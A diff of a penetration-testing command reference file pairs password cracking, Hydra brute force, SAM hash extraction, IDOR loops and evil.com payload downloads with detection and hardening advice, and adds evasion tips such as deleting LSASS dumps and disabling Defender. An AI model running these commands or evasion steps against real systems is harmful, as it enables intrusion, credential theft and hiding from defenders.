         "prerequisites": "Captured NetNTLM hashes and a wordlist.",
         "impact": "Plaintext passwords from poisoned authentications - initial access or lateral movement.",
         "prevention": "[MITRE T1110.002 M1027] Long, high-entropy passwords make the offline NetNTLM crack infeasible; the hash is already captured, so the victim cannot detect the cracking - password strength is the only defence.",
@@ -24225,10 +25522,17 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "LLMNR (Link-Local Multicast Name Resolution, UDP 5355) and NBT-NS (NetBIOS Name Service, UDP 137) are enabled by default on Windows and are used as fallback name resolution when DNS fails. These protocols broadcast name queries on the local network segment. Any host on the same subnet can respond to these broadcasts — a Responder instance claims to be the queried host and captures the NTLMv2 hash when the victim tries to authenticate.",
         "vulnerable_config": "# LLMNR enabled (Windows default):\n# Registry: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient\n#   EnableMulticast: (not set or 1) = LLMNR active\n\n# NBT-NS enabled (Windows default):\n# Network adapter -> TCP/IP properties -> WINS -> 'Enable NetBIOS over TCP/IP'\n# = Default (or Enabled)\n\n# Test: trigger a failed DNS lookup, watch Responder capture NTLMv2:\n# net use \\\\nonexistent  -> host broadcasts LLMNR for 'nonexistent'\n# Responder replies -> host sends NTLMv2 -> Responder captures it",
-        "secure_config": "# Disable LLMNR via GPO:\n# Computer Config > Admin Templates > Network > DNS Client\n#   'Turn off multicast name resolution' = Enabled\n# OR Registry:\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient' \\\n    -Name EnableMulticast -Value 0\n\n# Disable NBT-NS via GPO (push WMI script or DHCP option 001 = 0x2):\n# Or per-machine:\nGet-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object {\n    $_.SetTcpipNetbios(2)  # 2 = Disable NetBIOS\n}\n\n# Enable SMB signing (stops relay attacks even if hash captured):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\n\n# Deploy a honeypot LLMNR responder for detection\n# Sysmon/IDS: alert on Responder-like traffic (UDP 5355 responses from non-DC hosts)"
+        "secure_config": "# Disable LLMNR via GPO:\n# Computer Config > Admin Templates > Network > DNS Client\n#   'Turn off multicast name resolution' = Enabled\n# OR Registry:\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient' \\\n    -Name EnableMulticast -Value 0\n\n# Disable NBT-NS via GPO (push WMI script or DHCP option 001 = 0x2):\n# Or per-machine:\nGet-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object {\n    $_.SetTcpipNetbios(2)  # 2 = Disable NetBIOS\n}\n\n# Enable SMB signing (stops relay attacks even if hash captured):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\n\n# Deploy a honeypot LLMNR responder for detection\n# Sysmon/IDS: alert on Responder-like traffic (UDP 5355 responses from non-DC hosts)",
+        "evasion": "Run analyze-only first to gauge traffic; poison selectively (specific names) rather than everything; short windows reduce the chance a defender notices spoofed responses."
       },
       "tools": [
         "hashcat"
+      ],
+      "variations": [
+        {
+          "label": "John",
+          "command": "john --format=netntlmv2 <hashfile>"
+        }
       ]
     },
     {
@@ -24294,10 +25598,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "NT (1000)",
-          "command": "hashcat -m 1000 <hash_file> /usr/share/wordlists/rockyou.txt"
-        },
-        {
           "label": "DCC2 (2100)",
           "command": "hashcat -m 2100 <hash_file> /usr/share/wordlists/rockyou.txt"
         }
@@ -24308,7 +25608,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Cracks dumped Windows NTLM (or NetNTLMv2) hashes with hashcat to recover plaintext local/domain passwords.",
+        "why_it_works": "Windows NT hashes are unsalted MD4 of the password, so hashcat can test billions of candidates per second against them offline.",
         "prerequisites": "Dumped NTLM/NetNTLM hashes and a wordlist; GPU.",
         "impact": "Plaintext Windows passwords for reuse and lateral movement.",
         "prevention": "[MITRE T1110.002 M1027 Password Policies] Long, high-entropy, unique passwords resist offline cracking; use slow, salted hashing (bcrypt/argon2/PBKDF2) so each guess is expensive. Since the hash is already stolen, the victim cannot detect the cracking - defence is making the hash uncrackable in reasonable time.",
@@ -24318,7 +25618,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Credential material is accessible in multiple locations: SAM/NTDS.DIT via registry hives or VSS, LSASS minidump via Task Manager (non-admin on some configs), cached credentials in Windows Credential Manager (cmdkey), /etc/shadow readable by non-root. Offline attacks succeed because credentials are stored with weak hashing algorithms.",
         "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
-        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
+        "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)",
+        "evasion": "Dump LSASS to a file with a LOLBAS (comsvcs.dll MiniDump) or an evasive tool (nanodump) and PARSE OFFLINE so Mimikatz never runs on the host; bypass/►check RunAsPPL first; delete the .dmp after; for DCSync prefer -just-dc-user krbtgt over a full dump to touch fewer objects and generate one 4662 instead of many."
       },
       "type": "command"
     },
@@ -24401,10 +25702,6 @@ const COMMAND_DATA = {
         }
       ],
       "variations": [
-        {
-          "label": "Plain Dictionary",
-          "command": "hashcat -a 0 -m <mode> <hash> /usr/share/wordlists/rockyou.txt"
-        },
         {
           "label": "With Rules",
           "command": "hashcat -a 0 -m <mode> <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
@@ -24502,7 +25799,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Authentication protocols store or transmit passwords in formats that are offline-crackable: NTLM hashes (no salt, fast GPU attack), NTLMv2 net hashes (slightly slower but crackable), Kerberos RC4 hashes from Kerberoasting (offline crack without network contact), MD5/SHA1 web app hashes (no key stretching). Weak passwords crack in minutes; even complex ones crack with sufficient GPU power if hashing is fast.",
         "vulnerable_config": "# NTLM hash — no salt, instantaneous lookup with rainbow tables:\n# Hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n# 'password' -> hash computed in microseconds (MD4 algorithm)\n# 4x RTX 3090 GPUs: ~300 GH/s NTLM = 8-char complex password cracks in hours\n\n# Web app MD5 password storage:\n# $password = md5($_POST['password']);\n# Bcrypt would take 1000x longer per attempt for attacker",
-        "secure_config": "# Web apps — use bcrypt/Argon2 (adaptive, memory-hard):\nimport bcrypt\n# Hashing:\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))\n# Verification (slow by design):\nbcrypt.checkpw(password.encode(), hashed)\n\n# Python — Argon2 (winner of Password Hashing Competition):\nfrom argon2 import PasswordHasher\nph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)\nhash = ph.hash(password)\nph.verify(hash, password)\n\n# For AD/Windows: enforce Kerberos AES instead of RC4:\n# Disable RC4 in Group Policy\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Network security: Configure encryption types allowed for Kerberos'\n#   = AES128_HMAC_SHA1 + AES256_HMAC_SHA1 ONLY (uncheck RC4_HMAC_MD5)\n\n# Implement LAPS for local admin passwords\n# Regular credential rotation for service accounts"
+        "secure_config": "# Web apps — use bcrypt/Argon2 (adaptive, memory-hard):\nimport bcrypt\n# Hashing:\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))\n# Verification (slow by design):\nbcrypt.checkpw(password.encode(), hashed)\n\n# Python — Argon2 (winner of Password Hashing Competition):\nfrom argon2 import PasswordHasher\nph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)\nhash = ph.hash(password)\nph.verify(hash, password)\n\n# For AD/Windows: enforce Kerberos AES instead of RC4:\n# Disable RC4 in Group Policy\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Network security: Configure encryption types allowed for Kerberos'\n#   = AES128_HMAC_SHA1 + AES256_HMAC_SHA1 ONLY (uncheck RC4_HMAC_MD5)\n\n# Implement LAPS for local admin passwords\n# Regular credential rotation for service accounts",
+        "evasion": "Offline/local activity — generate lists off-target; no on-network footprint."
       },
       "type": "command"
     },
@@ -24597,7 +25895,7 @@ const COMMAND_DATA = {
     {
       "id": "hashcat-mask",
       "name": "Hashcat - Mask Attack",
-      "command": "hashcat -a 3 -m <mode> <hash> '?u?l?l?l?l?d?s'",
+      "command": "hashcat -a 3 -m <mode> <hashfile> 'Autumn?d?d?d?d!'",
       "description": "Brute forces against a mask (-a 3) that models a known password pattern using charsets: ?u upper, ?l lower, ?d digit, ?s symbol, ?a all. Faster than blind brute force when the policy or habit is known.",
       "platform": "linux",
       "requires": [
@@ -24932,8 +26230,33 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1003.002",
           "MITRE T1068"
-        ]
-      }
+        ],
+        "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable — test against a snapshot to avoid crashing the target."
+      },
+      "variations": [
+        {
+          "label": "Read hives from a shadow copy",
+          "command": "# copy SAM/SYSTEM/SECURITY from \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\"
+        },
+        {
+          "label": "Parse offline",
+          "command": "impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm non-admins can read SAM (CVE-2021-36934)",
+          "command": "icacls c:\\Windows\\System32\\config\\SAM"
+        },
+        {
+          "label": "Read the hives from a Volume Shadow Copy",
+          "command": "# HarddiskVolumeShadowCopy paths are readable even though the live files are locked"
+        },
+        {
+          "label": "Extract local hashes offline",
+          "command": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
+        }
+      ]
     },
     {
       "type": "command",
@@ -24954,7 +26277,7 @@ const COMMAND_DATA = {
         "reverse-lookup",
         "brute-force"
       ],
-      "category": "Information Gathering",
+      "category": "Enumeration",
       "subcategory": "DNS",
       "certifications": [
         "OSCP"
@@ -24966,11 +26289,6 @@ const COMMAND_DATA = {
       "description": "DNS lookups using the host command: forward lookups, specific record type queries (MX, TXT, NS), forward brute force, and reverse PTR sweeps.",
       "command": "host <domain>",
       "variations": [
-        {
-          "description": "Forward DNS lookup (A record)",
-          "command": "host <domain>",
-          "label": "host lookup"
-        },
         {
           "description": "MX record lookup",
           "command": "host -t mx <domain>",
@@ -24989,17 +26307,17 @@ const COMMAND_DATA = {
         {
           "description": "Forward brute force — append prefix list to domain",
           "command": "for ip in $(cat <wordlist>); do host $ip.<domain>; done",
-          "label": "Batch loop"
+          "label": "Subdomain loop (wordlist)"
         },
         {
           "description": "Forward brute force — filter resolved hosts only",
           "command": "for ip in $(cat <wordlist>); do host $ip.<domain>; done | grep -v 'not found'",
-          "label": "Batch loop"
+          "label": "Subdomain loop (filter misses)"
         },
         {
           "description": "Reverse sweep — PTR lookups across address range",
           "command": "for ip in $(seq <start> <end>); do host <prefix>.$ip; done | grep -v 'not found'",
-          "label": "Batch loop"
+          "label": "Numeric range loop"
         },
         {
           "description": "Lookup specific IP via reverse DNS",
@@ -25188,7 +26506,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
-        "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+        "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
+        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
       },
       "variations": [
         {
@@ -25210,11 +26529,6 @@ const COMMAND_DATA = {
           "description": "Debug nginx port conflict (if bind fails)",
           "command": "sudo tail -2 /var/log/nginx/error.log\nss -lnpt | grep 80\nps -ef | grep <pid>\nsudo rm /etc/nginx/sites-enabled/default",
           "label": "Watch error log"
-        },
-        {
-          "description": "Upload file via curl PUT to nginx endpoint",
-          "command": "curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt",
-          "label": "GET request"
         },
         {
           "description": "Verify uploaded file on server",
@@ -25284,10 +26598,6 @@ const COMMAND_DATA = {
       "command": "python3 -m http.server 8000",
       "description": "Serve the current directory over HTTP so a target can download from you. Use whichever interpreter is installed; uploadserver also accepts uploads.",
       "variations": [
-        {
-          "label": "Python 3",
-          "command": "python3 -m http.server 8000"
-        },
         {
           "label": "Python 2",
           "command": "python2.7 -m SimpleHTTPServer"
@@ -25702,7 +27012,8 @@ const COMMAND_DATA = {
           "HTB M23",
           "MITRE T1190",
           "OWASP A05:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): user input reaches a shell/exec call.\n  system( / exec( / shell_exec( / passthru( / popen( / proc_open(  |  os.system / subprocess(..., shell=True)  |  child_process.exec(  |  backticks `...`\nGREP:  grep -rniE \"system\\(|exec\\(|shell_exec|passthru|popen|proc_open|os\\.system|subprocess.*shell=True|child_process\\.exec\\(|`.*\\$\" .\nSAFE:  avoid the shell; use argument arrays / execve-style APIs (subprocess.run([...], shell=False)); strict allowlist; escapeshellarg only as last resort."
       }
     },
     {
@@ -25882,7 +27193,7 @@ const COMMAND_DATA = {
     {
       "id": "hydra-bruteforce",
       "name": "Hydra - Brute Force Network Service",
-      "command": "hydra -L <user.list> -P <password.list> <proto>://<ip>",
+      "command": "hydra -L <userlist> -P <wordlist> <proto>://<ip>",
       "description": "Online password brute force against a network service. -L/-P take username and password lists; swap to -l/-p for a single value; -C uses a combined user:pass file. -t limits parallel tasks to avoid lockouts.",
       "platform": "linux",
       "requires": [
@@ -25965,15 +27276,15 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SSH",
-          "command": "hydra -L <user.list> -P <password.list> ssh://<ip>"
+          "command": "hydra -L <userlist> -P <wordlist> ssh://<ip>"
         },
         {
           "label": "RDP",
-          "command": "hydra -L <user.list> -P <password.list> rdp://<ip> -t 4"
+          "command": "hydra -L <userlist> -P <wordlist> rdp://<ip> -t 4"
         },
         {
           "label": "SMB",
-          "command": "hydra -L <user.list> -P <password.list> smb://<ip>"
+          "command": "hydra -L <userlist> -P <wordlist> smb://<ip>"
         }
       ],
       "opsec": "loud",
@@ -26002,7 +27313,7 @@ const COMMAND_DATA = {
     {
       "id": "hydra-cred-stuffing",
       "name": "Hydra - Credential Stuffing",
-      "command": "hydra -C <user_pass.list> ssh://<ip>",
+      "command": "hydra -C <userpass_list> ssh://<ip>",
       "description": "Tests known user:password pairs from a single combined file (-C) against a service, rather than every cross product. Use this to replay credentials leaked or found elsewhere against a target (credential stuffing).",
       "platform": "linux",
       "requires": [
@@ -26060,7 +27371,7 @@ const COMMAND_DATA = {
       ],
       "exam": "exam-ok",
       "defense": {
-        "why_it_works": "Credential stuffing replays known username:password pairs (from breaches) against a service, exploiting password reuse.",
+        "why_it_works": "Reused credentials from breaches work across unrelated services; Hydra replays known user:pass pairs against a login to find reuse.",
         "prerequisites": "A list of breached credential pairs and access to the target service.",
         "impact": "Access to any account where the user reused a breached password.",
         "detection": "Failed authentication bursts: Windows 4625 (failed logon) and 4771 (Kerberos pre-auth failed) at abnormal rate/volume; account lockouts (4740); many attempts from one source, or - for spraying - one password across many accounts. SIEM correlation on failed-logon spikes.",
@@ -26075,12 +27386,22 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
         "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
       },
-      "type": "command"
+      "type": "command",
+      "variations": [
+        {
+          "label": "HTTP POST form",
+          "command": "hydra -L users.txt -P pass.txt <ip> http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\""
+        },
+        {
+          "label": "Single service, user:pass list",
+          "command": "hydra -C <userpass_list> <service>://<ip>"
+        }
+      ]
     },
     {
       "id": "hydra-http-basic",
       "name": "Hydra - HTTP Basic Auth Brute Force",
-      "command": "hydra -l <user> -P <passwords.txt> <ip> http-get / -s <port>",
+      "command": "hydra -l <user> -P <wordlist> <ip> http-get / -s <port>",
       "description": "Brute forces HTTP Basic Authentication (the browser popup that sends an Authorization: Basic header). Use the http-get module against the protected path; -s sets a non-default port. Supply -L for a username list instead of a single -l.",
       "platform": "linux",
       "requires": [
@@ -26116,12 +27437,12 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "FTP brute force",
-          "command": "hydra -L <users.txt> -P <passwords.txt> -s <port> -V ftp://<ip>",
+          "command": "hydra -L <userlist> -P <wordlist> -s <port> -V ftp://<ip>",
           "description": "Brute force FTP credentials. -s overrides the default port 21; -V shows each attempt."
         },
         {
           "label": "SSH brute force",
-          "command": "hydra -l <user> -P <passwords.txt> ssh://<ip>",
+          "command": "hydra -l <user> -P <wordlist> ssh://<ip>",
           "description": "Password brute force against SSH. Consider rate limits and fail2ban — use -t 4 to slow down."
         },
         {
@@ -26131,7 +27452,7 @@ const COMMAND_DATA = {
         },
         {
           "label": "Multi-target SSH",
-          "command": "hydra -l <user> -p <pass> -M <targets.txt> ssh",
+          "command": "hydra -l <user> -p <pass> -M <hostlist> ssh",
           "description": "Test the same credential against multiple hosts listed in targets.txt."
         }
       ],
@@ -26183,7 +27504,7 @@ const COMMAND_DATA = {
     {
       "id": "hydra-http-post-form",
       "name": "Hydra - Login Form Brute Force (http-post-form)",
-      "command": "hydra -L <users.txt> -P <passwords.txt> -f <ip> -s <port> http-post-form \"<path>:<params>:<condition>\"",
+      "command": "hydra -L <userlist> -P <wordlist> -f <ip> -s <port> http-post-form \"<path>:<params>:<condition>\"",
       "description": "Brute forces a POST login form. The module string has three colon-separated parts: the form path, the POST body with ^USER^/^PASS^ placeholders, and a condition telling Hydra how to spot failure (F=<text>) or success (S=<text> or S=302). -f stops on the first hit.",
       "platform": "linux",
       "requires": [
@@ -26276,17 +27597,17 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Failure condition (text match)",
-          "command": "hydra -L <users.txt> -P <passwords.txt> -f <ip> -s <port> http-post-form \"<path>:<params>:F=<failure_text>\"",
+          "command": "hydra -L <userlist> -P <wordlist> -f <ip> -s <port> http-post-form \"<path>:<params>:F=<failure_text>\"",
           "description": "Stop when the response CONTAINS the failure string (e.g. 'Invalid credentials'). Most common pattern — inspect the login page's error message and paste it exactly."
         },
         {
           "label": "Success condition (302 redirect)",
-          "command": "hydra -L <users.txt> -P <passwords.txt> -f <ip> -s <port> http-post-form \"<path>:<params>:S=302\"",
+          "command": "hydra -L <userlist> -P <wordlist> -f <ip> -s <port> http-post-form \"<path>:<params>:S=302\"",
           "description": "Stop when the server responds with HTTP 302 (redirect after successful login). Use when there's no consistent failure string but a successful login redirects."
         },
         {
           "label": "Success condition (keyword)",
-          "command": "hydra -L <users.txt> -P <passwords.txt> -f <ip> -s <port> http-post-form \"<path>:<params>:S=Dashboard\"",
+          "command": "hydra -L <userlist> -P <wordlist> -f <ip> -s <port> http-post-form \"<path>:<params>:S=Dashboard\"",
           "description": "Stop when the response CONTAINS the success keyword (e.g. 'Dashboard', 'Welcome', 'Logout'). Use when a successful login renders a page with a unique string."
         }
       ],
@@ -26379,7 +27700,8 @@ const COMMAND_DATA = {
           "HTB M26",
           "MITRE T1078.002",
           "MITRE T1611"
-        ]
+        ],
+        "evasion": "Use the symlink/takeown path once to grab the target file, then restore ownership/permissions."
       }
     },
     {
@@ -26576,7 +27898,8 @@ const COMMAND_DATA = {
           "HTB M23",
           "MITRE T1083",
           "OWASP A01:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): object fetched by a request-supplied id with NO ownership/authorization check.\n  SELECT * FROM x WHERE id = req.params.id   (no AND owner_id = session.user)  |  findById(req.query.id) returned directly\nGREP:  grep -rniE \"findById|WHERE id ?= ?(\\$_|req\\.|params)|/:(id|uid|user_id)\" .\nSAFE:  enforce OBJECT-LEVEL authorization on every access (verify the resource belongs to the caller); use unpredictable IDs (UUID) as defense-in-depth only."
       }
     },
     {
@@ -26663,8 +27986,15 @@ const COMMAND_DATA = {
           "HTB M23",
           "MITRE T1083",
           "OWASP A01:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): object fetched by a request-supplied id with NO ownership/authorization check.\n  SELECT * FROM x WHERE id = req.params.id   (no AND owner_id = session.user)  |  findById(req.query.id) returned directly\nGREP:  grep -rniE \"findById|WHERE id ?= ?(\\$_|req\\.|params)|/:(id|uid|user_id)\" .\nSAFE:  enforce OBJECT-LEVEL authorization on every access (verify the resource belongs to the caller); use unpredictable IDs (UUID) as defense-in-depth only."
+      },
+      "variations": [
+        {
+          "label": "Loop + save all objects",
+          "command": "for i in $(seq 1 500); do curl -s 'http://<ip>:<port>/documents.php?uid='$i | grep -oE 'href=\"[^\"]+\"'; done"
+        }
+      ]
     },
     {
       "type": "payload",
@@ -26751,8 +28081,29 @@ const COMMAND_DATA = {
           "HTB M23",
           "MITRE T1083",
           "OWASP A01:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): object fetched by a request-supplied id with NO ownership/authorization check.\n  SELECT * FROM x WHERE id = req.params.id   (no AND owner_id = session.user)  |  findById(req.query.id) returned directly\nGREP:  grep -rniE \"findById|WHERE id ?= ?(\\$_|req\\.|params)|/:(id|uid|user_id)\" .\nSAFE:  enforce OBJECT-LEVEL authorization on every access (verify the resource belongs to the caller); use unpredictable IDs (UUID) as defense-in-depth only."
+      },
+      "variations": [
+        {
+          "label": "Iterate the object id",
+          "command": "for i in $(seq 1 100); do curl -s 'http://<ip>/download.php?file_id='$i -o f_$i; done"
+        },
+        {
+          "label": "Encoded/hashed ids",
+          "command": "# decode base64/md5 ids, increment, re-encode"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Spot a direct object reference",
+          "command": "http://<ip>:<port>/download.php?file_id=<own_id>"
+        },
+        {
+          "label": "Change it to another user's id",
+          "command": "http://<ip>:<port>/download.php?file_id=<other_id>"
+        }
+      ]
     },
     {
       "type": "script",
@@ -26937,8 +28288,15 @@ const COMMAND_DATA = {
           "HTB M23",
           "MITRE T1083",
           "OWASP A01:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): object fetched by a request-supplied id with NO ownership/authorization check.\n  SELECT * FROM x WHERE id = req.params.id   (no AND owner_id = session.user)  |  findById(req.query.id) returned directly\nGREP:  grep -rniE \"findById|WHERE id ?= ?(\\$_|req\\.|params)|/:(id|uid|user_id)\" .\nSAFE:  enforce OBJECT-LEVEL authorization on every access (verify the resource belongs to the caller); use unpredictable IDs (UUID) as defense-in-depth only."
+      },
+      "variations": [
+        {
+          "label": "Change role/uid in the JSON body too",
+          "command": "# PUT with body {\"uid\":<admin_uid>,\"role\":\"admin\"}"
+        }
+      ]
     },
     {
       "id": "cdsa-m09-ids-ips-fundamentals",
@@ -27128,7 +28486,8 @@ const COMMAND_DATA = {
           "HTB M24",
           "MITRE T1083",
           "OWASP A05:2021"
-        ]
+        ],
+        "evasion": "The 8.3 short-name probe is inherently noisy (many 404s) — throttle requests and target a single path prefix to reduce log volume."
       }
     },
     {
@@ -27202,10 +28561,6 @@ const COMMAND_DATA = {
       "description": "Scan the mail-retrieval ports, then log in with curl (IMAPS) or openssl to read folders/messages and confirm credentials.",
       "variations": [
         {
-          "label": "Nmap scan",
-          "command": "sudo nmap <ip> -sV -p110,143,993,995 -sC"
-        },
-        {
           "label": "curl IMAPS list folders",
           "command": "curl -k 'imaps://<ip>' --user user:p4ssw0rd"
         },
@@ -27235,7 +28590,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 — no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data — auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS — version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
-        "secure_config": "# IPMI — disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync — require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec — disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS — disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
